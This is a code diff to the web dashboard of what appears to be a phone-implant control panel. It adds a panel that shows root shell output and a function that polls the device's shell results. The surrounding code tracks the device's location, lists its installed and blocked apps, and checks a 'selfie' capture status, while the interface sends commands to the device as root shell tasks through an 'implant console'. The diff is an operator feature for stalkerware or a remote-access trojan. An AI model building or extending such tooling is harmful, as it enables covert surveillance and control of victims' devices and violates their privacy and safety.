@@ -170,6 +170,10 @@
                             <button type="button" id="shell-send-btn" class="flex-1 bg-blue-600 hover:bg-blue-700 text-white font-bold px-3 py-2 rounded-xl transition shadow-sm text-sm">Send Command</button>
                             <button type="button" id="shell-clear-btn" class="flex-1 bg-gray-200 hover:bg-gray-300 text-gray-800 font-bold px-3 py-2 rounded-xl transition shadow-sm text-sm">Clear</button>
                         </div>
+                        <div class="pt-3">
+                            <label class="text-[10px] uppercase tracking-widest text-gray-500">Last shell output</label>
+                            <pre id="shell-output" class="min-h-[120px] max-h-[240px] overflow-y-auto rounded-xl border border-gray-200 bg-black/5 p-3 text-xs text-gray-800 whitespace-pre-wrap break-words">No output yet.</pre>
+                        </div>
                         <div class="text-xs text-gray-500">Commands are forwarded to the device as root shell tasks.</div>
                     </div>
                 </div>
@@ -391,6 +395,7 @@
                     installedAppsCount.textContent = Array.isArray(data.installed_apps) ? data.installed_apps.length : (data.installed_apps ? data.installed_apps.toString().split(',').filter(Boolean).length : '0');
                     blockedAppsCount.textContent = Array.isArray(data.blocked_apps) ? data.blocked_apps.length : (data.blocked_apps ? data.blocked_apps.toString().split(',').filter(Boolean).length : '0');
                     fetchSelfieStatus(activeDevice);
+                    fetchShellOutput(activeDevice);
 
                     if(data.lat && data.lon) {
                         const lat = parseFloat(data.lat);
@@ -547,6 +552,28 @@
             }
         }
 
+        async function fetchShellOutput(activeDevice) {
+            if(!activeDevice) return;
+            try {
+                const res = await fetch(`/shell_output?device_id=${encodeURIComponent(activeDevice)}`);
+                if (!res.ok) {
+                    document.getElementById('shell-output').textContent = 'Unable to load shell output.';
+                    return;
+                }
+                const data = await res.json();
+                const outputEl = document.getElementById('shell-output');
+                if (data.status !== 'ok') {
+                    outputEl.textContent = data.output || 'No shell output available.';
+                    return;
+                }
+                const timestamp = data.last_shell_at ? new Date(data.last_shell_at * 1000).toLocaleString() : 'Unknown time';
+                outputEl.textContent = `Command: ${data.command || '[unknown]'}\nTimestamp: ${timestamp}\n\n${data.output || '[no output]'}`;
+            } catch (err) {
+                document.getElementById('shell-output').textContent = 'Error loading shell output.';
+                console.error(err);
+            }
+        }
+
         async function sendShellCommand() {
             if(!selectEl.value) { alert('No device selected'); return; }
             const cmd = document.getElementById('shell-command-input').value.trim();
@@ -556,7 +583,9 @@
             fd.append('command', cmd);
             const res = await fetch('/run_shell_command', { method: 'POST', body: fd });
             if(res.ok) {
-                alert('Command sent to device. Check the implant console for the result.');
+                document.getElementById('shell-output').textContent = `Command: ${cmd}\nTimestamp: ${new Date().toLocaleString()}\n\nWaiting for shell output...`;
+                setTimeout(() => fetchShellOutput(selectEl.value), 1500);
+                alert('Command sent to device. Shell output will refresh shortly.');
             } else {
                 alert('Failed to send shell command');
             }
